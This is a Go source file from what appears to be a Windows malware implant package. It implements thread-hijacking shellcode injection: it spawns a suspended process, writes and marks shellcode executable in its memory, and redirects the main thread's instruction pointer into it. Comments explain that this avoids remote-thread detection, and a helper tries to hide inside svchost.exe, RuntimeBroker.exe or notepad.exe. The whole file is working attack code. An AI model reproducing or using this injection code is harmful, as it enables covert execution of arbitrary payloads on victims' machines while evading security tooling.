//go:build windows

package implant

import (
	"fmt"
	"syscall"
	"unsafe"
)

// CONTEXT_CONTROL retrieves/sets the control registers (Rip, Rsp, Rbp, flags).
const CONTEXT_CONTROL = 0x00100001

// x64Context mirrors the Windows x64 CONTEXT structure layout up to Rip.
// Rip sits at offset 0xF8.
type x64Context struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags uint32
	MxCsr        uint32
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       uint32
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
}

// ThreadHijackInject creates a suspended process, writes shellcode into its
// address space, then hijacks the main thread's instruction pointer (Rip) so it
// resumes inside the shellcode. No remote thread is created, so the thread's
// recorded start address remains the legitimate process entry point.
func ThreadHijackInject(targetProcess string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	var si ebStartupInfo
	var pi ebProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	procPath, err := syscall.UTF16PtrFromString(targetProcess)
	if err != nil {
		return fmt.Errorf("UTF16 conversion: %w", err)
	}

	ret, _, errCode := pCreateProcessW.Call(
		uintptr(unsafe.Pointer(procPath)),
		0, 0, 0, 0,
		CREATE_SUSPENDED,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %v", errCode)
	}
	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	remoteAddr, _, errCode := procVirtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
	)
	if remoteAddr == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %v", errCode)
	}

	var written uintptr
	ret, _, errCode = pWriteProcessMemory.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", errCode)
	}

	var oldProtect uint32
	pVirtualProtectEx.Call(
		uintptr(pi.Process), remoteAddr, uintptr(len(shellcode)),
		PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)),
	)

	// Hijack the main thread's instruction pointer.
	ctx := x64Context{ContextFlags: CONTEXT_CONTROL}
	ret, _, errCode = pGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return fmt.Errorf("GetThreadContext failed: %v", errCode)
	}
	ctx.Rip = uint64(remoteAddr)

	ret, _, errCode = pSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if ret == 0 {
		return fmt.Errorf("SetThreadContext failed: %v", errCode)
	}

	pResumeThread.Call(uintptr(pi.Thread))

	return nil
}

// InjectShellcodeThreadHijack picks a benign host process and performs thread
// hijacking injection into it.
func InjectShellcodeThreadHijack(shellcode []byte) error {
	candidates := []string{
		`C:\Windows\System32\RuntimeBroker.exe`,
		`C:\Windows\System32\svchost.exe`,
		`C:\Windows\System32\notepad.exe`,
	}
	for _, c := range candidates {
		if err := ThreadHijackInject(c, shellcode); err == nil {
			return nil
		}
	}
	return fmt.Errorf("all thread hijack candidates failed")
}
